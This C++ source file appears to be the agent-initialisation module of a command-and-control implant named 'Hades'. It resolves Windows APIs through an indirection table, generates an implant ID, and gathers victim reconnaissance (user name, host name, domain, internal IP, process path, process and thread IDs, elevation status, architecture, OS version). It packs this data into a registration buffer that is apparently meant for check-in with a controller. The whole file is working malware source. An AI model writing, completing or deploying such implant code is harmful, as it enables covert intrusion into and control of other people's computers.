#include <WS2tcpip.h>
#include <stdio.h>
#include <iphlpapi.h>
#include "common.hpp"
#include "apidefs.hpp"
#include "bytes.hpp"
#include "nt.hpp"
#include "network.hpp"
#include "config.hpp"


WINAPIS* WinApis = NULL;
MODULES* kModules = NULL;

BOOL GetVer(RTL_OSVERSIONINFOW* ver) {
	ver->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	return WinApis->RtlGetVersion(ver);
}


ULONG GenID() {
	ULONG S = WinApis->GetTickCount();
	ULONG id = WinApis->RtlRandomEx(&S);
	return id;
}


PBYTE CollectProcessPath(DWORD* out) {
	PBYTE buffer = AllocMemory<BYTE>(32767);

	DWORD Len = WinApis->GetModuleFileNameA(NULL, (PCHAR)buffer, 32767);
	*out = Len;
	return buffer;


}


PBYTE CollectUser(DWORD* out) {
	DWORD BufSize = NULL;
	WinApis->GetUserNameA(NULL, &BufSize);
	PBYTE buffer = AllocMemory<BYTE>(BufSize);

	if (!WinApis->GetUserNameA((PCHAR)buffer, &BufSize)) {
		return NULL;
	}
	*out = BufSize;
	return buffer;

}


PBYTE CollectHost(DWORD* out) {
	DWORD BufSize = NULL;
	WinApis->GetComputerNameExA(ComputerNameDnsHostname, NULL, &BufSize);
	PBYTE buffer = AllocMemory<BYTE>(BufSize);

	if (!WinApis->GetComputerNameExA(ComputerNameDnsHostname, (PCHAR)buffer, &BufSize)) {
		return NULL;
	}
	*out = BufSize;
	return buffer;
}


PBYTE CollectDomainName(DWORD* out) {
	DWORD BufSize = NULL;
	WinApis->GetComputerNameExA(ComputerNameDnsDomain, NULL, &BufSize);
	PBYTE buffer = AllocMemory<BYTE>(BufSize);

	if (!WinApis->GetComputerNameExA(ComputerNameDnsDomain, (PCHAR)buffer, &BufSize)) {
		return NULL;
	}
	*out = BufSize;
	return buffer;
}



BOOL IsElevated() {

	HANDLE tok = 0;;
	TOKEN_ELEVATION Elev = { 0 };
	BOOL isElev = FALSE;
	DWORD size = sizeof(TOKEN_ELEVATION);
	NTSTATUS stat = WinApis->NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok);
	if (stat > 0) {
		BOOL check = WinApis->GetTokenInformation(tok, TokenElevation, &Elev, sizeof(Elev), &size);
		if (check) {
			isElev = (BOOL)(Elev.TokenIsElevated != FALSE) ? 1 : 0;
		}
	}
	if (tok) {
		WinApis->CloseHandle(tok);
	}

	return isElev;
}


PBYTE GetInternalIP(DWORD* out) {
	ULONG BufLen = 0;
	PIP_ADAPTER_INFO adapter = NULL;
	PIP_ADAPTER_INFO adapter_info = NULL;
	WinApis->GetAdaptersInfo(NULL, &BufLen);
	adapter_info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BufLen);
	
	DWORD ret = WinApis->GetAdaptersInfo(adapter_info, &BufLen);
	if (ret != ERROR_SUCCESS) {
		HeapFree(GetProcessHeap(), 0, adapter);
		return NULL;
	}

	PBYTE AddrStr = AllocMemory<BYTE>(16);

	for (adapter = adapter_info; adapter != NULL; adapter = adapter->Next) {
		IP_ADDR_STRING* addr = &adapter->IpAddressList;
		while (addr != NULL) {
			memcpy(AddrStr, addr->IpAddress.String, 16);
			*out = 16;
			return AddrStr;
		}
	}
	return NULL;



}


BOOL InitAgent() {
	
	WinApis =  AllocMemory <WINAPIS>   (sizeof(struct WINAPIS));
	kModules = AllocMemory <MODULES>   (sizeof(struct MODULES));
	g_ByteMgr = AllocMemory <bytes>    (sizeof(bytes));
	g_Network = AllocMemory <Network>  (sizeof(Network));
	if (!LoadAPIS()) { return FALSE; }
	if (!LoadConfig()) { return FALSE };
	

	DWORD UserLen, HostLen, DomainLen, ProcessPathLen, IpLen;

	ULONG HadesID     = GenID();
	PBYTE User        = CollectUser         (&UserLen);
	PBYTE Host        = CollectHost         (&HostLen);
	PBYTE ProcessPath = CollectProcessPath  (&ProcessPathLen);
	PBYTE Domain      = CollectDomainName   (&DomainLen);
	PBYTE IpAddr      = GetInternalIP       (&IpLen);
	DWORD TID         = TO_DWORD            (GetTeb()->ClientId.UniqueThread);
	DWORD PID         = TO_DWORD            (GetTeb()->ClientId.UniqueProcess);
	BOOL Arch         = (sizeof(void*) != 4);
	BOOL IsElev       = IsElevated();
	RTL_OSVERSIONINFOW osVer;
	GetVer(&osVer);

	PBYTE RegisterBytes = AllocMemory<BYTE>(BASE_BUFFER_SIZE);


	// todo, clean this up
	g_ByteMgr->InitWrite(RegisterBytes, BASE_BUFFER_SIZE);
	g_ByteMgr->Write4(HadesID);
	g_ByteMgr->Write4(UserLen);
	g_ByteMgr->WriteString(User, UserLen);
	g_ByteMgr->Write4(HostLen);
	g_ByteMgr->WriteString(Host, HostLen);
	g_ByteMgr->Write4(IpLen);
	g_ByteMgr->WriteString(IpAddr, IpLen);
	g_ByteMgr->Write4(ProcessPathLen);
	g_ByteMgr->WriteString(ProcessPath, ProcessPathLen);
	g_ByteMgr->Write4(PID);
	g_ByteMgr->Write4(TID);
	g_ByteMgr->Write1(IsElev);
	g_ByteMgr->Write1(Arch);
	g_ByteMgr->Write4(osVer.dwMinorVersion);
	g_ByteMgr->Write4(osVer.dwMajorVersion);
	g_ByteMgr->Write4(osVer.dwBuildNumber);




	if (User)        { HeapFree(GetProcessHeap(), 0, User);        }
	if (Host)        { HeapFree(GetProcessHeap(), 0, Host);        }
	if (Domain)      { HeapFree(GetProcessHeap(), 0, Domain);      }
	if (ProcessPath) { HeapFree(GetProcessHeap(), 0, ProcessPath); }
	if (IpAddr)      { HeapFree(GetProcessHeap(), 0, IpAddr); }
	return TRUE;

}










